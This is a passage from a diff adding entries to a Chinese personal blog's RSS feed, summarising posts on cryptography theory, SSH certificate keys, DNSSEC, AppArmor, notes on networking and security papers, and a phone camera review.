上，并且使用了 Github Action 进行容器自动构建并推送到 docker.io 上，使用命令 docker push ertuil/wickftps:latest 下载。</description>
+    </item>
+    <item>
+      <title>200823</title>
+      <link>https://www.elliot98.top/zone/200823/</link>
+      <pubDate>Sun, 23 Aug 2020 10:55:51 +0800</pubDate>
+      <guid>https://www.elliot98.top/zone/200823/</guid>
+      <description>唔 &amp;hellip; 最近想写的博客太多了（量子密码、格密码、路由算法），完全写不完了 &amp;hellip; 给自己开太多坑就是这样吧 2333 &amp;hellip;</description>
+    </item>
+    <item>
+      <title>技术摘要| SSH 公钥</title>
+      <link>https://www.elliot98.top/post/tech/ssh-keys/</link>
+      <pubDate>Fri, 21 Aug 2020 00:00:00 +0000</pubDate>
+      <guid>https://www.elliot98.top/post/tech/ssh-keys/</guid>
+      <description>Hosts:&#xA;@cert-authority * ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLXoOLEoVkIX+M3ETB3G5OxoZy0Zxlpr07FL9cEp/5ZPqY/qqnKEeUZtFDUEOYb6angPdRr2HCE4diojCXUAIqE= Devices:&#xA;cert-authority,principals=&amp;#34;layton&amp;#34; ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLXoOLEoVkIX+M3ETB3G5OxoZy0Zxlpr07FL9cEp/5ZPqY/qqnKEeUZtFDUEOYb6angPdRr2HCE4diojCXUAIqE= </description>
+    </item>
+    <item>
+      <title>论文笔记| Concurrent Entanglement Routing for Quantum Networks: Model and Designs</title>
+      <link>https://www.elliot98.top/post/lab/sigcomm20-concurrent-entanglement-routing-for-quantum-networks/</link>
+      <pubDate>Fri, 14 Aug 2020 15:55:59 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/lab/sigcomm20-concurrent-entanglement-routing-for-quantum-networks/</guid>
+      <description>Brief Authors: Shouqian Shi and Chen Qian University of California SIGCOMM 2020 量子互联网中的路由问题。现有的量子互联网模型中，一个典型的应用场景就是秘钥分发，也就是两个节点之间通过量子信道来进行秘密共享，这样能够实现信息论上的安全。但是基于量子的秘钥分发通常是基于纠缠或者是单光子的，有一个问题是纠缠对的传输距离短、持续时间短，因此相聚很远的节点之间就很难进行直接的纠缠分发。&#xA;现有的量子网络中的做法是使用一个可信中继来进行传输距离的扩展（比如京沪量子干线中有济南和合肥的可信中继），可是这个可信中继的引入使得网络的安全性似乎不那么强了。为了解决这种问题，一个新的被称为 Swapping 的量子纠缠操作被引入。Swapping 是指将两个纠缠对耦合在一起，形成一个长距离纠缠对的操作。这样只需要可信中继和通信双方分别建立量子纠缠对，而后进行一次 Swapping 操作即可实现通信双方的纠缠对的构造；此时，可信中继也无法干预秘钥分发，从而保障了系统的安全。&#xA;一个量子互联网场景下，任意两个量子节点之间都可以进行秘钥交换，只需要进行多次 Swapping 操作即可。但是，每一个量子节点的能力是有限的：量子纠缠对的信道数量是有限的、量子比特存储能力是有限的、量子纠缠对的持续时间是有限的。在这种情况下，路由和资源分配就变成了一个问题。怎么样选取中间节点，使得网络的吞吐量最大化呢？&#xA;文章将秘钥分发离散称为若干的周期进行，每个周期分为四阶段进行：&#xA;网络接收需要进行秘钥分发的通信双方的申请，也就说接收多个 SD 对（Source-Destination） 网络根据拓扑结构和 SD 对进行选路，选择若干个候选路径 网络根据选路情况建立纠缠对（有概率失败） 网络根据局部纠缠对的建立情况，来进行 Swapping 操作，从而构成完整的量子信道建立。 文章提出了两种具体的路由算法，分别是：&#xA;Q-PASS，这种算法在四阶段前引入了一个离线阶段，预先计算出了每两个通信双方之间的可能路径，而后在第二阶段进行竞争性地选路，选取优先级最高的若干条路径，之后进行量子纠缠的建立。 Q-CAST，这种路由算法没有离线阶段，每次根据输入的 SD 对来及时的计算可能的路径。而后，使用一个贪婪算法（扩展的迪姐斯特拉算法）进行主要路径和保留路径的选取，选取一条路径后直接分配所需要的资源，尽力而为的建立连接。 作者进行了模拟实验，发现 Q-CAST 相比已有算法有更好的吞吐量、鲁棒性和扩展性。</description>
+    </item>
+    <item>
+      <title>论文笔记| Come as You Are: Helping Unmodified Clients Bypass Censorship with Server-side Evasion</title>
+      <link>https://www.elliot98.top/post/lab/sigcomm20-come-as-you-are/</link>
+      <pubDate>Thu, 13 Aug 2020 10:57:28 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/lab/sigcomm20-come-as-you-are/</guid>
+      <description>Authors: Kevin Bock, George Hughey, Louis-Henri Merinno et. al. conference: SIGCOMM 2020 这篇文章主要讲着这么一件事情，大部分的对抗审查的方案都需要在客户端做文章，但是这也会有一些问题：比如客户端运行一个代理程序可能不安全、代理程序不够通用、大部分用户对于审查是无感知的 &amp;hellip;&#xA;那么可不可以只在服务器一端通过对 TCP 报文的修改整合来实现绕过审查呢？ 文章利用 Geneva 这样一个基于遗传算法的流量分析工具来寻找只在服务端对流量进行修改来绕过审查的方案并且发现了一系列这样的绕过的方案。文章说自己的主要贡献是发现了有服务端发起绕过也是可以的。&#xA;根据文章的模型，大部分的审查都是 Man on the middle，也就是审查者可以观察和分析通信双方的所有流量，同时可以在连接中插入 RST 等报文来干扰连接。更加强的攻击是 Man in the middle, 也就是审查者直接位于通信链路的中间位置，可以直接阻断连接双方（通常有巨大的延迟影响？）。在 MotM 的情况下，就有很多客户端可以绕过手段了。&#xA;在不同的上层应用和不同的审查机制下，这些绕过方案可能会有一些不同。举个客户端绕过的例子，比如通过客户端和服务器发起一个 TCP 连接的头两个报文是 SYN 和 ACK+SYN 报文。此时，客户端构造一个精心设计的 RST 报文。这个报文的 TTL 只能到达审查处而无法到达服务器端。这样，审查认为这个链接被终止了，但是实际上服务器并没有收到 RST 报文。这样就建立了连接。再举一个服务器发起绕过的方案：服务器在收到客户端发起的 SYN 报文后，分别单独地发送 ACK 报文和 SYN 报文。由审查过滤 ACK 报文后， SYN 报文继续和客户端重新建立三次握手。&#xA;文章进行了大量的实验。他们针对不同的防火墙（四个国家）以及不同应用（DNS over TCP、HTTP、HTTPS、FTP）等场景下，企图使用 Geneva 来寻找绕过的方案，并最终给出了绕过的方法。文章还对结果进行了分析，给出了兼容性测试以及对审查防火墙本身进行了一些讨论。&#xA;（作者补充：这个团队的博客上分析了近期对于 ESNI 的封锁，同时也给出了针对 ESNI 封锁的绕过办法。）</description>
+    </item>
+    <item>
+      <title>小米 10 手机的拍照体验</title>
+      <link>https://www.elliot98.top/post/life/mi10-photo/</link>
+      <pubDate>Wed, 15 Jul 2020 09:06:35 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/life/mi10-photo/</guid>
+      <description>小米 10 （非 pro） 手机拍照体验 自从 iPhone 出了故障送回家修了之后，我就入手了一部【小米 10】手机。通过这段时间的体验，对他的拍照性能算是有了一些了解吧。&#xA;首先要申明的是小米 10 并非是拍照手机，相机的硬件配置并不强，有一个一亿像素的广角镜头、一个 1300 万像素的超广角镜头，以及两百万像素的景深镜头和两百万像素的微距镜头。的确，从硬件配置上来说小米 10 的相机硬件参数是普普通通的，甚至算不上的是优秀。&#xA;一亿像素主摄超强 一亿像素的主摄广角镜头是非常强悍的，拍照非常清晰，画质也不错。它配合景深镜头可以实现非常良好的浅景深和人像模式。小米 10 手机的拍照速度并不快，拍照的时候只要记得端平、端稳，可以获得非常不错的画面哦。&#xA;主摄像 f1.7 的通光量在夜晚也勉强能够一战，当然首先于镜头传感器尺寸的影响，和我的单反相机以及华为手机等还是有一定差距的。&#xA;很行的超广角和不怎么行的长焦 小米 10 自带一个 1300 万像素的超广角镜头，如果构图合适，往往可以拍出非常惊艳的画面，画质也是不错了。&#xA;首先从变焦讲起，小米 10 手机由于不带长焦镜头，它的变焦只有 10 倍的数码变焦，也就是裁切。好在是从一亿像素里做裁切，放大倍率不大的时候画质还是勉强能用的。对于我来说，如果不是确有必要记录远处的内容的，我可能不会使用数码变焦的功能，而是选择后期进行二次构图。&#xA;真假微距镜头 小米 10 的主摄像头的最近对焦距离其实非常近，所以一般情况直接使用主摄拍摄静物小品和食物就可以取得非常不错的画面效果。这一点是出乎我的意外的。下面是样张：&#xA;另外小米 10 还附带了一个 200 万像素的微距镜头。它的对焦距离几乎不存在，可以拍摄非常非常近的物体的细节。当然，仅仅是【拍得到】，200 万像素真的涂抹感是有点严重了，需要拍摄的构图合理和光线充足，才拍出不错的照片。&#xA;MIUI 12 的拍照软件和算法 手机摄影很多程度上是靠软件和算法来弥补硬件的不错，也不失为一条非常有前景的发展道路。因此手机软件和算法就非常重要了。总体来说，MIUI12 的拍照软件还是非常让我满意的。&#xA;从渲染偏好上，MIUI 相机的色彩是偏向艳丽的，看起来非常讨喜。对于我来说，有时候反而需要降一点饱和度。但是总体调教风格我还是比较喜欢的。小米&#xA;但是有一个槽点是：不知道是不是算法的原因，我一直感觉 MIUI 拍摄的照片的曝光并不准确，通常是偏暗了 0.3EV - 1EV ，经常需要我手动去拉高亮度。&#xA;另一个槽点就是有时候默认的景深太浅了，非常不合时宜，你也没有快速的方式去调整。只有两个选择：1. 打开专业模式去手动调整参数设置。 2. 启动 AI 模式，如果 AI 识别是风景，则会调整景深和对焦。&#xA;丰富多彩的滤镜 MIUI 12 自带了很多很多的滤镜，可以非常方便的选择自己合适的色彩风格，非常贴合手机摄影快速出片的特点，我觉得这一点做得非常好。但是还有一个问题就是我没有找到后期调整白平衡的设置。我希望 MIUI 12 的相机工程师能够补上这个功能，可以让我快速的利用白平衡进行风格调整。</description>
+    </item>
+    <item>
+      <title>技术摘要| 论 DNSSEC 系统的信任锚点和旁路验证扩展 (DLV)</title>
+      <link>https://www.elliot98.top/post/tech/dnssec-dlv/</link>
+      <pubDate>Sun, 14 Jun 2020 20:57:12 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/dnssec-dlv/</guid>
+      <description>域名树和 DNS 递归查询 DNS 作为一个非常重要的互联网基础设施，已经陪伴我们走过了数十个春夏秋冬。DNS 系统的最基础的功能，便是将一个人类可读的域名，转化为一个机器可读的 IP 地址。然后安全性并不在 DNS 系统设计的早期考量之中。直到 DNSSEC 的出现，才给这个问题带来了一线解决的希望。&#xA;DNS 域名系统是一个树状结构。根域名构成了域名系统的根，根域名之下有若干个全球顶级域名，比如耳熟能详的 .com ， .org 等等。再往下便是大家更加熟悉的 baidu.com， apple.com 这些域名。就这样，域名系统构成了域名数。&#xA;域名的递归查询操作也便是在这样的树上进行从根到叶子的查询操作。比如查询 www.baidu.com 的 IP 地址。那么首先 DNS 查询报文首先发往了全球 13 个根 DNS 服务器之一。这些服务器进一步返回了 .com DNS 服务器的地址，也就是一个 NS 记录。之后，向 .com DNS 地址查询 baidu.com 的 DNS 服务器地址。最后从 baidu.com 的 DNS 服务器地址查询得到 www.baidu.com 的 IP 地址。&#xA;当然，引入了缓存和 CNAME 之后，使得查询过程变得更加复杂，但是原理上就是域名树上递归地从根到叶子的递归查询过程。&#xA;DNSSEC 的签名验证过程 DNSSEC 是这样的，在 DNS 系统中引入了一个类似 PKI 的体系，并提供了域名和公钥哈希的绑定关系。这样，可以使用公钥来验证域名解析及其签名。DNS 域名树的结构，正好提供了一个非常可靠的 PKI/CA 结构，因此 DNSSEC 是直接架设在域名树之上，而无需额外维护一个 CA 体系。</description>
+    </item>
+    <item>
+      <title>密码学专题| 七、公钥密码体系和 Diffin-Hellman 交换</title>
+      <link>https://www.elliot98.top/post/crypto/crypto-dh-exchange/</link>
+      <pubDate>Sat, 30 May 2020 16:51:23 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/crypto/crypto-dh-exchange/</guid>
+      <description>从对称密码体系到公钥密码体系 设想一个系统有 N 个人希望进行互相通信。如果使用原始的对称密码体系，则每一个人需要维护 N-1 个秘钥。整个系统需要维护 （N-1)N/2 个秘钥。这个方案是非常不“优雅”的：&#xA;需要与两两之间都需要可靠的信道进行秘钥分配 秘钥管理非常繁琐 开放系统只几乎是不可能的 人员的进入和退出时复杂的 在一个封闭式的系统中，可以使用 Needham-Schroeder 秘钥分配方案。系统中引入了一个秘钥分配中心 KDC 的角色。每一个参与者都需要维护一个与 KDC 之间的秘钥。&#xA;Alice -&amp;gt; KDC: &amp;lt;Alice, Bob&amp;gt;&#xD;KDC -&amp;gt; Alice: &amp;lt; E_{k_{Alice}}(Alice,Bob, session_key, other_information)&#xD;E_{k_{Bob}}(Alice,Bob, session_key, other_information)&amp;gt;&#xD;Alice -&amp;gt; Bob:&#xD;E_{k_{Bob}}(Alice,Bob, session_key, other_information)&amp;gt; 但是该方案依然有不足：&#xA;方案是封闭的 安全性依赖于 KDC 的安全性 KDC 可能存在单点瓶颈（SPOF） 使用公钥密码体系 使用公钥密码体系引入了下面三个新的密码学原语言：&#xA;数字信封：对标对称加密的公钥加密算法 数字签名：对标消息认证码的私钥签名算法 DH 秘钥交换：用于分布式的进行会话秘钥的协商 DH 秘钥交换 秘钥交换实验描述如下：&#xA;两个持有 \(1^n\) 的通信双方执行协议 \(\Pi\)。之后得到会话秘钥 k 和通信消息 m 随机选取一个比特 \( b \leftarrow \lbrace 0,1 \rbrace^n \)。如果 b = 1，则 \(k&amp;rsquo; = k)。否则 \( k&amp;rsquo; \leftarrow \lbrace 0,1 \rbrace^ n \)。 给多项式运行时间的敌手 A 输入 k&amp;rsquo; 和 m，输出一个比特 \(b&amp;rsquo;\) 当且仅当 \(b&amp;rsquo; = b\) ，记 \(Adv_{A,\Pi}^{KE} = 1\) 秘钥交换协议是计算安全的，当且仅当： \[ Pr[Adv_{A,\Pi}^{KE} = 1] \le \frac{1}{2} + negl(n) \]</description>
+    </item>
+    <item>
+      <title>密码学专题| 六、基于数学难解问题假设的单向函数</title>
+      <link>https://www.elliot98.top/post/crypto/crypto-math/</link>
+      <pubDate>Sat, 30 May 2020 10:33:55 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/crypto/crypto-math/</guid>
+      <description>前文介绍了如果使用单向函数构造伪随机数发生器，进而构建计算安全的密码学算法。但是目前没有任何一个被严格证实的单向函数。但是基于近世代数可以构造一系列单向函数的候选数学难解问题。我们假设这些难解问题是多项式时间不可解的，并且构建了一系列实际在用的密码学算法。&#xA;群论 定义一个集合 G 和集合中的一个二元映射 + ,满足如下条件则成为一个群：&#xA;封闭性： \(\forall a, b \in G, a+b \in G \) 单位元存在： \(\exists e \in G, \forall a \in G, e+a = a+e = a \) 存在逆元： \(\forall g \in G, \exists h \in G, g+h = h+g =e 记 h=g^{-1} \) 结合律： \( \forall a,b,c \in G, (a+b)+c = a+(b+c) \) 如何满足如下条件成为阿贝尔群（交换群）：&#xA;交换率： \(\forall a, b \in G, a+b = b + a \) 有限元素的群称为有限群，群的大小（也就是群元素的个数）为群的阶 |G|。</description>
+    </item>
+    <item>
+      <title>密码学专题| 五、基于单项函数的伪随机性构造</title>
+      <link>https://www.elliot98.top/post/crypto/crypto-cipher/</link>
+      <pubDate>Fri, 29 May 2020 18:02:53 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/crypto/crypto-cipher/</guid>
+      <description>单向函数和单项置换 如果单项函数存在，则提供了一种构造伪随机发生器和伪随机函数的方案，进而可以用于构造流密码、分组密码以及消息认证码。&#xA;单项函数的定义如下:&#xA;当一个函数 \( f: \{0,1\}^* \rightarrow \{0,1\}^* \)满足如下条件，则是一个单项函数：&#xA;存在一个多项式时间算法 \(M_f \) 有 \(M_f(x) = f(x) \) \( \forall x \leftarrow \{0,1\}^* s.t. Pr[A(f(x)) \in f^{-1}(f(x))] \le negl(n) \) 如果将函数 f 的定义域和值域修改为 \( \{0,1\}^n \) 则定义了单项置换：&#xA;当一个函数 \( f_n: \{0,1\}^n \rightarrow \{0,1\}^n \)满足如下条件，则是一个单项函数：&#xA;存在一个多项式时间算法 \(M_{f_n} \) 有 \(M_{f_n}(x) = f_n(x) \) \( \forall x \leftarrow \{0,1\}^n s.t. Pr[A(f_n(x)) \in f_n^{-1}(f_n(x))] \le negl(n) \) 目前无法证明任何一个候选函数是单项函数，但是有一些备选函数，包括：&#xA;大整数的素数分解问题 子集求和问题等 单项函数都有一个硬核，我的理解是硬核提供了最原始的函数的单项特性。如果一个单射函数拥有硬核，那么这是一个单项函数。但是这个单项函数可能提供了来自自变量 x 的其他信息。硬核谓词的定义如下：</description>
+    </item>
+    <item>
+      <title>密码学专题| 四、实际分组密码 —— DES 和 AES</title>
+      <link>https://www.elliot98.top/post/crypto/crypto-blockcipher/</link>
+      <pubDate>Fri, 29 May 2020 16:02:31 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/crypto/crypto-blockcipher/</guid>
+      <description>实际密码方案与实际安全 分组密码加密方案假设了分组代换-置换是一种伪随机函数，这是一个非常典型的安全假设。另一个 RSA 算法假设大数分解是困难。这些假设的引入，使得加密方案的安全性不再等于计算安全。&#xA;如果假设成立，分组代换-置换是一种伪随机函数，那么可以证明这种加密方案是满足计算安全假设的。然而，如果分组置换并不满足伪随机函数的定义，此时基于分组代换-置换的分组密码就无法达到了计算安全假设了。RSA 的例子也是如此，我们都假设大数分解难题是一个 NP 问题，因此一个线性多项式时间的敌手攻破 RSA 算法的可能性很低。但是如果 N=NP，此时 RSA 算法就不再是安全的了。&#xA;我们称这样一种基于长期认为可靠、或者是有大量理论认为成立的假设的安全为实际安全。通常，这时候，我们认为这些加密方案在一个非常可靠的时间内是安全的（比如十年或者一百年）。&#xA;代换-置换网络是分组密码的基本结构 将 n 个数随机置换，有约 \(n*2^n\) 种可能性。分组置换中，分组大小 n 应当充分的大，分组密码的安全性和 n 的大小直接相关。就目前来说 128 bit 几乎是最低标准， 256 bit 和 512 bit 的分组将变得更加流行。&#xA;一个分组置换网络通常具有许多轮，比较典型的数字是 16 轮及以上。每一轮中，子秘钥将和明文进行混合，通过被称为 “S盒” 的固定置换函数，并进行位置代换。&#xA;注意到此时 “S 盒” 是一个一一映射的函数，也就是说这种置换是可逆的。此时可以发现这种映射可以说是线性的，那么还需要位置轮换，进行非线性映射。&#xA;通常，在这种网络中，需要充分利用雪崩效应，也就是单个 bit 的改变也应当影响其他尽可能多的 bit 。这要求算法设计满足下面一些条件： S 盒的设计，使得单个 bit 输入的差值可以输出在尽可能多的位数上；单个 S 盒的改变，应当进入下一轮多个 S 盒中；尽可能增加分组置换的轮数。&#xA;DES 算法族和 Feistel 网络 Feistel 网络 这种网络是一个可逆的分组置换网络，其具有基本的变换形式如下：将第 i 轮输入分为左侧输入 \(L_i\) 和右侧属于 \(R_i\)。还有一个和子秘钥 \(k_i\) 相关的不可逆函数 \(f_i\)。那么： \[L_i = R_{i-1}, R_i = L_{i-1} \bigotimes f_i(k_i, R_{i-1}) \]</description>
+    </item>
+    <item>
+      <title>密码学专题| 三、完整性保护和消息认证码</title>
+      <link>https://www.elliot98.top/post/crypto/crypto-mac/</link>
+      <pubDate>Thu, 28 May 2020 20:12:48 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/crypto/crypto-mac/</guid>
+      <description>消息认证码 MAC 消息鉴别码 MAC 的定义如下：&#xA;Gen: 输入 \(1^n\) ，输出秘钥 k Mac: 输入 k 和消息 \(m \in \{0,1\}^* \)，输出签名 t。 Verify: 输入秘钥 k 消息 \(m \in \{0,1\}^* \) 以及签名 t ，输出布尔值： \( b \leftarrow Verify_k(m, t)\) 考虑其攻击模型 \(Adv_A^{\Pi_M}\)：&#xA;考虑一个多项式运行时间的敌手 A 运行 Gen 生成随机秘钥 k。 A 可以任意访问黑盒 \(Mac_k\)，并输出任意多 \( (m,t) \in Q \) 对。 A 最终构造一对 \( (m^,t^) \notin Q \) 满足 \( Verify_k(m, t) = 1 \) 如果其 \(Adv_A^{\Pi_M}\) 满足如下公式，则认为该消息认证方案 \(\Pi_M\) 是计算安全的： \[ Pr[Adv_A^{\Pi_M} = 1] \le negl(n) \]</description>
+    </item>
+    <item>
+      <title>密码学专题| 二、伪随机生成器和安全加密方案</title>
+      <link>https://www.elliot98.top/post/crypto/crypto-random/</link>
+      <pubDate>Thu, 28 May 2020 14:41:59 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/crypto/crypto-random/</guid>
+      <description>伪随机 伪随机是指对于任意多项式时间（PTT）的算法来说，对于一个长度为 l 的字符串，分辨出它是来自分布 \(D_l\) 的采样还是来自随机均匀分布 l 长度字符串，是不可行的。&#xA;因此可以定义出伪随机发生器：&#xA;定义一个多项式 l， G 为一个确定的多项式时间算法，满足输入一个种子 \(s \leftarrow {0,1}^n \)，输出一个长度为 l(n) 的字符串。G 是为伪随机发生器当且仅当 G 满足如下两个条件：&#xA;\(l(n) &amp;gt; n\)，否则没有伪随机可言。 定义一个示性函数 D：\(D(X) = 1\) 当且仅当可以判断该随机字符串满足分布 X。并且记 \(R_m\) 表示长度为 m 的均匀随机分布。G 满足： \( | Pr[D(R_{l(n)}) = 1] - Pr[D(G(s)) = 1] | \le negl(n) \) 也就是说，伪随机数发生器是指，一个通过种子 s 生成长度为 l(n) 字符串的确定性算法，但是无法区分该字符串是否来自于l(n)长度的均匀随机分布。&#xA;伪随机数发生器在密码学中，有比较重要的意义。一个非常直观的概念就是可以将满足完美安全的一次一密算法改造成满足计算安全的实际可用的加密算法。这也是流加密算法的核心思想。试想，在计算安全的条件下，我们可以通过一个定长的随机数种子 s ，通过伪随机数发生器 G ，产生一个长度为 l(n) 的伪随机字符串，那么是不是可以直接使用这个字符串（也就是秘钥流）与明文进行按位异或，从而得到一个安全的计算安全的流加密算法。&#xA;伪随机数发生器存在的问题有：&#xA;由于种子 s 的长度有限，因此实际输出的字符串空间相比均匀随机分布的空间相比是小很多的。因此s 必须足够的长。 多项式时间限制，如果考虑一个计算能力无限的敌手，可以通过遍历整个 s 空间的方式来进行蛮力攻击，从而破解伪随机数发生器。也就是说，伪随机数发生器是计算安全而非完美安全的 存在性存疑。除非引入一些假设，目前无法证明伪随机数发生器是存在的。当我们相信单向函数存在的时候，那么可以构造一系列伪随机数发生器。 防止已知明文攻击的计算安全加密方案 定长的计算安全加密方案 可以证明，在定长条件下，上文提到的加密方案是计算安全的。这里证明忽略：</description>
+    </item>
+    <item>
+      <title>密码学专题| 一、论加密模型的完美安全、计算安全和实际安全</title>
+      <link>https://www.elliot98.top/post/crypto/crypto-models/</link>
+      <pubDate>Thu, 28 May 2020 08:31:39 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/crypto/crypto-models/</guid>
+      <description>加密模型 定义所有的明文消息空间为 \( M \)，Alice 希望将其中一条明文 \( m \in M \) 通过密码学加密算法 \(Enc\) 变换成了密文 \(c\)，然后通过不可靠信道传输。Bob 收到 \(c\) 后则通过对应解密算法 \(Dec\) 将 \(c\) 还原成 \(m\)。此时也就是说：&#xA;\[Dec(Enc(m)) = m\]&#xA;这就是古典密码学加密模型的基本原理，是基于算法 \(\{Enc,Dec\}\)的保密性来提供安全性。但是这种保护的成本是非常大的，密码学人员流动、算法泄密都需要更换密码学算法。此外，古典密码学的安全性是无法进行量化考量的。因此，引入了秘钥 \(k\) 的概念，Kerckhoffs 原理 是说：&#xA;Kerckhoffs 原理: 一个密码学系统中，除了秘钥 \(k\) 之外的其他部分都被公开，仍然需要能够提供安全性保护。&#xA;此时引入了现代的加密模型，\( \{M, Gen, Enc, Dec\} \) 定义了一个加密方案：&#xA;有一个明文空间 \( M \) 和其中的待加密明文 \( m \in M \) 有一个密文空间 \( C \) 以及加密后得到的密文 \( c \in C \) 有一个秘钥生成算法 \( Gen \)，以及一个秘钥 \(k = Gen(\delta) \)，其中 \(\delta\) 是一个安全参数 一个加密算法 \(Enc\) 满足 \(c = Enc_k(m)\) 和一个解密算法 \(Dec\) 满足 \(m = Dec_k(c)\) 那么什么样的加密模型是安全的呢？在《Introductino of Modern Cryptography》 中给出的答案：</description>
+    </item>
+    <item>
+      <title>技术摘要| 从自主到强制——浅谈Linux 强制访问控制 AppArmor</title>
+      <link>https://www.elliot98.top/post/tech/apparmor/</link>
+      <pubDate>Fri, 22 May 2020 09:23:49 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/tech/apparmor/</guid>
+      <description>AppArmor 是 Linux 系统中提供的强制访问控制 （MAC） 的安全控件，能够为我们的服务器提供更多的安全保障。但凡提起强制访问控制，我就会想起《计算器安全》这门课上学到的一堆枯燥的名词、概念和模型。仿佛强制访问控制离我们太远，很无趣，也没什么用。且慢，不妨让我们从 Linux 原生的访问控制说起。&#xA;Linux 权限是不完备的？ Linux 系统原生控制机制（DAC) 相比大家都已经了解了。自主访问控制最大的特点就是由文件所有者来对文件进行访问控制。文件所有者可以对文件的权限进行设置，比如 Linux 系统下，就将一个文件的权限设置为 属主权限 (u) ，属组权限 (g) 以及其他人权限 (o) 三类来进行控制。当一个进程要读写一个文件的时候， Linux 内核就要充当看门老大爷的角色，判断这个进程是否有读写的权限。如果进程的有效所有者和文件所有者相同，则根据属主权限 (u)进行判断；如果有效用户组与文件属组相同，则根据属组权限(g)进行判断；否则根据其他人权限(o)进行判断。&#xA;就好比张三和李四是同一间寝室的同学。张三有张三柜子的钥匙，他可以对柜子里的东西进行处置（属主权限）。张三和李四都拥有寝室的钥匙（张三和李四都属于同一个用户组）。但是隔壁寝室的老王却没有办法进入张三的寝室，也没有办法大概张三的柜子。这时候一切都很美好、很和谐。但是有一天，张三想把柜子里的大宝贝分享给隔壁寝室的老王。他应该怎么做呢？&#xA;修改柜子的属者，把柜子交给老王？不行，这个柜子还是张三的，他可不想随便把柜子里的大宝贝送给别人。 将老王加入到寝室的用户组里？不行，李四不愿意把钥匙交给隔壁老王。 修改柜子的其他人权限？不错，老王是能够访问柜子了，可是隔壁的隔壁的老陈也能偷瞟柜子里的大宝贝了。 张三没有办法，他只能再新建一个用户组（比如叫做“大宝贝分享组”），然后把老王添加到这个组中，然后再修改柜子的用户组为“大宝贝分享组”。很麻烦，对吧？ 其实还有一个困难。就是张三根本就没有办法使用 groupadd 命令，这一个命令是管理员命令，只能由班长来使用，可惜张三他并不是班长。因此这个办法也不能行得通。上面说了这么多，其实只是想吐槽一下 Linux 自主访问控制的设计是不完备的，不能满足很多需求。&#xA;Windows NT 内核下的权限设计就要完备得多。Windows 下的文件权限控制不再分为属主、属组和其他人三类，而是可以为系统中的每一个用户、每一个用户组单独的分配权限。这些权限构成了一个叫做 ACL 的访问控制列表。&#xA;从自主访问控制到强制访问控制 上面这个所说的这个问题其实对于普通用户来说，或许还并不关键。但是对于 root 用户来说，却变成了一个非常致命的问题。root 用户经常要下方一些权限给特定的用户或者特定用户组，这些操作往往是非常复杂且 dirty 的，最关键的是稍有不慎就可能导致严重的安全问题。&#xA;Linux 内核后续强制访问控制模块，强制访问控制就是集中式的控制每一个进程的能力（比如能访问哪些文件、拥有哪些权限、可以监听什么网络地址等等）。这时候对于进程的限制不再是由文件所有者进行控制了，而是直接由系统管理员进行控制，也可以进行更加精细的设计。&#xA;最早的 Linux 强制访问控制是 SeLinux 模块，想必各位 Centos 管理员都听说过。这个模块配置太复杂了，因此很多人上手的第一件事就是关闭这个模块。在 Debian/Ubuntu 下，使用 AppArmor 更为原生、更加简单易用。虽然没有 SeLinux 那么强，但是也能提供不错的安全防护。&#xA;另一个不使用 SeLinux 的原因是很多人认为美国国家安全局 NSA 主导的 SeLinux 不靠谱，可能有·后门。</description>
+    </item>
+    <item>
+      <title>论文笔记| NDSS 2020 的几篇论文通读</title>
+      <link>https://www.elliot98.top/post/lab/ndss2020-3/</link>
+      <pubDate>Mon, 16 Mar 2020 15:44:37 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/lab/ndss2020-3/</guid>
+      <description>SYMTCP: Eluding Stateful Deep Packet Inspection with Automated Discrepancy Discovery 作者： Zhongjie Wang NDSS 2020 TCP等有状态的网络协议的实现需要使用状态机模型。但是由于文档使用自然语言描述，导致不同的网络协议实现的状态机之间会有差别。深度包检测也需要使用类似的状态机。通过利用状态机之间的差异，可以实现数据包非预期的被过滤或者放行。&#xA;文章形式化的构建了上述的操作，并符号执行的方法来自动发掘一个linux网络协议栈和特定DPI之间的状态机差异。最终实现了对于 Zeek, Snort 或者GFW的绕过。&#xA;Let’s Revoke: Scalable Global Certificate Revocation Trevor Smith et al. NDSS 2020 提供了一种高效、隐私、可扩展的证书撤销和查询机制。 使用一个 CRV 数组来表示特定CA特定截止日期下的所有证书撤销信息。每一个证书有一个RID（CA、过期时间、统一过期时间下的递增撤销号RN） 例如：RID = Let’s Encrypt : March 1, 2018 : 24561 。 当撤销的时候，CRV的对应 RN的位置1。更新CRV时候，可以使用AND和OR进行增量更新、或者使用NEW操作来全量更新CRV列表。&#xA;好处是：&#xA;过期之后的CRV可以直接丢弃 时间窗口较小（1day） 网络流量较少、本地存储较小、具有较小的计算消耗 具有隐私性、不保留特定证书信息 具有可审计性等 Post-Quantum Authentication in TLS 1.3: A Performance Study Post-Quantum Authentication in TLS 1.3: A Performance Study 作者 Dimitrios Sikeridis NDSS 2020 文章主要将目前NIST文档中的一些候选的PQ算法结合到 TLSv1.</description>
+    </item>
+    <item>
+      <title>论文笔记| On Using Application-Layer Middlebox Protocols for Peeking Behind NAT Gateways</title>
+      <link>https://www.elliot98.top/post/lab/ndss2020-2/</link>
+      <pubDate>Sun, 15 Mar 2020 21:26:28 +0800</pubDate>
+      <guid>https://www.elliot98.top/post/lab/ndss2020-2/</guid>
